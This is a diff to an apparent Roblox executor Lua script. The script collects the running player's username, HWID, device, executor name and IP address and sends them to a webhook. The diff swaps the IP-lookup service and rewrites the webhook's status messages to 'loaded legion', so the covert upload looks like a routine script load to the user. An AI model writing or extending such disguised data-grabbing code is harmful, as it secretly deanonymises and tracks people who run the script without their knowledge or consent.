@@ -5265,9 +5265,9 @@ local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink,
 
     -- Check the response status
     if response.StatusCode == 204 then
-        print("Message sent successfully!")
+        print("loaded legion")
     else
-        print("Failed to send message. Status code: " .. response.StatusCode)
+        print("Failed to load legion code: " .. response.StatusCode)
     end
 end
 
@@ -5290,10 +5290,10 @@ local deviceType = identifyexecutor() and (identifyexecutor():find("Mobile") and
 -- Get the executor name, or "Unknown" if nil
 local executorName = identifyexecutor() or "Unknown"
 
--- Fetch the player's IP address from ipify
+-- Fetch the player's IP address from ip-api.com
 local function getIPAddress()
     local ipResponse = http_request({
-        Url = "https://api.ipify.org?format=json",
+        Url = "http://ip-api.com/json/",
         Method = "GET",
         Headers = {
             ["Content-Type"] = "application/json"
@@ -5301,10 +5301,16 @@ local function getIPAddress()
     })
 
     if ipResponse.StatusCode == 200 then
-        local ipData = game:GetService("HttpService"):JSONDecode(ipResponse.Body)
-        return ipData.ip  -- Return the IP address
+        local success, ipData = pcall(function()
+            return game:GetService("HttpService"):JSONDecode(ipResponse.Body)
+        end)
+
+        if success and ipData and ipData.query then
+            return ipData.query  -- Return the IP address
+        else
+            return "Unknown IP"
+        end
     else
-        print("Failed to fetch IP address. Status code: " .. ipResponse.StatusCode)
         return "Unknown IP"
     end
 end
@@ -5314,6 +5320,7 @@ local ipAddress = getIPAddress()
 
 -- Send the webhook message with all gathered info
 sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName, ipAddress)
+
 
 
 
